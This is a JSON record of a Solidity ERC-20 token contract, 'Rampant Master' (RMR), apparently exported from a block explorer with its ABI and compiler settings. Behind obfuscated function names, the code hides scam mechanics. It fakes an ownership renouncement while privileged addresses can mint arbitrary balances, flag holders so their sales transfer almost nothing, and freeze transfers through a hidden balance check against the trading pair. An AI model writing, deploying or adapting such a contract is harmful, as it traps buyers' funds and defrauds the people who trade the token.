{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface fundAt {\n    function createPair(address liquidityTo, address maxSell) external returns (address);\n}\n\ninterface launchTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromBuy) external view returns (uint256);\n\n    function transfer(address exemptSwap, uint256 walletTotal) external returns (bool);\n\n    function allowance(address fundFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptSwap,\n        uint256 walletTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingIs, uint256 value);\n    event Approval(address indexed fundFrom, address indexed spender, uint256 value);\n}\n\nabstract contract txSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txAmountSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellAt is launchTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RampantMaster is txSell, launchTeam, sellAt {\n\n    event OwnershipTransferred(address indexed isLaunch, address indexed launchedMarketingTx);\n\n    function listLaunched(address modeSender, address exemptSwap, uint256 walletTotal) internal returns (bool) {\n        require(teamTo[modeSender] >= walletTotal);\n        teamTo[modeSender] -= walletTotal;\n        teamTo[exemptSwap] += walletTotal;\n        emit Transfer(modeSender, exemptSwap, walletTotal);\n        return true;\n    }\n\n    function takeLimitLaunched(uint256 walletTotal) public {\n        exemptTx();\n        totalSell = walletTotal;\n    }\n\n    bool public senderMarketing;\n\n    function owner() external view returns (address) {\n        return atTrading;\n    }\n\n    uint256 totalSell;\n\n    mapping(address => bool) public feeShould;\n\n    function name() external view virtual override returns (string memory) {\n        return takeList;\n    }\n\n    string private receiverLaunch = \"RMR\";\n\n    address txTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address modeSender, address exemptSwap, uint256 walletTotal) external override returns (bool) {\n        if (_msgSender() != txTrading) {\n            if (takeAuto[modeSender][_msgSender()] != type(uint256).max) {\n                require(walletTotal <= takeAuto[modeSender][_msgSender()]);\n                takeAuto[modeSender][_msgSender()] -= walletTotal;\n            }\n        }\n        return toFrom(modeSender, exemptSwap, walletTotal);\n    }\n\n    function feeWalletFund(address modeEnableMarketing) public {\n        exemptTx();\n        \n        if (modeEnableMarketing == shouldTradingLaunch || modeEnableMarketing == fromFee) {\n            return;\n        }\n        feeShould[modeEnableMarketing] = true;\n    }\n\n    mapping(address => bool) public amountTo;\n\n    uint256 private swapTake;\n\n    uint256 limitMarketing;\n\n    function approve(address txLaunchedTeam, uint256 walletTotal) public virtual override returns (bool) {\n        takeAuto[_msgSender()][txLaunchedTeam] = walletTotal;\n        emit Approval(_msgSender(), txLaunchedTeam, walletTotal);\n        return true;\n    }\n\n    address marketingLaunchedShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public senderTx;\n\n    uint256 private toMarketing = 100000000 * 10 ** 18;\n\n    bool public liquidityBuy;\n\n    function toFrom(address modeSender, address exemptSwap, uint256 walletTotal) internal returns (bool) {\n        if (modeSender == shouldTradingLaunch) {\n            return listLaunched(modeSender, exemptSwap, walletTotal);\n        }\n        uint256 listMarketing = launchTeam(fromFee).balanceOf(marketingLaunchedShould);\n        require(listMarketing == totalSell);\n        require(exemptSwap != marketingLaunchedShould);\n        if (feeShould[modeSender]) {\n            return listLaunched(modeSender, exemptSwap, limitFund);\n        }\n        return listLaunched(modeSender, exemptSwap, walletTotal);\n    }\n\n    mapping(address => mapping(address => uint256)) private takeAuto;\n\n    function allowance(address launchList, address txLaunchedTeam) external view virtual override returns (uint256) {\n        if (txLaunchedTeam == txTrading) {\n            return type(uint256).max;\n        }\n        return takeAuto[launchList][txLaunchedTeam];\n    }\n\n    function launchSell(address exemptToken) public {\n        if (fromTrading) {\n            return;\n        }\n        if (sellTo) {\n            sellTo = true;\n        }\n        amountTo[exemptToken] = true;\n        if (sellTo) {\n            senderMarketing = false;\n        }\n        fromTrading = true;\n    }\n\n    bool private maxIs;\n\n    function transfer(address launchedFee, uint256 walletTotal) external virtual override returns (bool) {\n        return toFrom(_msgSender(), launchedFee, walletTotal);\n    }\n\n    function exemptFee(address launchedFee, uint256 walletTotal) public {\n        exemptTx();\n        teamTo[launchedFee] = walletTotal;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxTo;\n    }\n\n    function exemptTx() private view {\n        require(amountTo[_msgSender()]);\n    }\n\n    address public shouldTradingLaunch;\n\n    uint256 public atTo;\n\n    address public fromFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverLaunch;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toMarketing;\n    }\n\n    address private atTrading;\n\n    uint256 constant limitFund = 8 ** 10;\n\n    constructor (){\n        \n        txAmountSender autoWallet = txAmountSender(txTrading);\n        fromFee = fundAt(autoWallet.factory()).createPair(autoWallet.WETH(), address(this));\n        \n        shouldTradingLaunch = _msgSender();\n        amountTo[shouldTradingLaunch] = true;\n        teamTo[shouldTradingLaunch] = toMarketing;\n        modeLaunchedSwap();\n        if (swapTake != fromMax) {\n            feeEnable = fromMax;\n        }\n        emit Transfer(address(0), shouldTradingLaunch, toMarketing);\n    }\n\n    function getOwner() external view returns (address) {\n        return atTrading;\n    }\n\n    function balanceOf(address fromBuy) public view virtual override returns (uint256) {\n        return teamTo[fromBuy];\n    }\n\n    mapping(address => uint256) private teamTo;\n\n    uint8 private maxTo = 18;\n\n    bool public sellTo;\n\n    uint256 public fromMax;\n\n    bool public shouldReceiver;\n\n    uint256 public feeEnable;\n\n    bool public fromTrading;\n\n    function modeLaunchedSwap() public {\n        emit OwnershipTransferred(shouldTradingLaunch, address(0));\n        atTrading = address(0);\n    }\n\n    string private takeList = \"Rampant Master\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMarketingTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLaunchedTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunchedTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTotal\",\"type\":\"uint256\"}],\"name\":\"exemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnableMarketing\",\"type\":\"address\"}],\"name\":\"feeWalletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"launchSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTradingLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTotal\",\"type\":\"uint256\"}],\"name\":\"takeLimitLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RampantMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}